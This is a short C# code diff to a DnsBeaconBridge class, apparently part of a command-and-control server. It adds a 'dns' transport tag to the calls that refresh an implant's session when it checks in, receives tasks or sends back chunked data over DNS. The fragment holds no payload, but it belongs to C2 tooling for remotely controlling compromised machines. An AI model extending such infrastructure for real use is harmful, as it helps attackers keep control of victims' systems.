@@ -83,7 +83,7 @@ internal sealed class DnsBeaconBridge
 
         // Re-touch with the session's own capabilities: the touch replaces
         // them, and a DNS check-in carries no advertisement of its own.
-        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), cancellationToken);
+        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
 
         var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken);
         if (dispatched is null)
@@ -131,7 +131,7 @@ internal sealed class DnsBeaconBridge
         var session = await _sessions.GetActiveAsync(implant, cancellationToken);
         if (session is null)
             return;
-        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), cancellationToken);
+        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
 
         // The terminal chunk closes the reassembly; null means keep buffering
         // (more chunks) or drop (a gap in the sequence).
